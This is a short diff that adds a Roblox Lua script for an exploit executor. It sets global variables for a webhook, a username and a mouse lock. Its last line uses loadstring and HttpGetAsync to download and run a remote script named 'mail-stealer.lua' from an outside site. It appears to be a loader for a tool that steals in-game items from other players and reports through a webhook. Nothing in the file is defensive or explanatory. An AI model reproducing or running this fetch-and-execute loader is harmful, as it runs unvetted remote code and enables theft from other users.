@@ -1,0 +1,4 @@
+getgenv().webhook = "" 
+getgenv().name = "raniel_jud"
+getgenv().mouselock = true
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
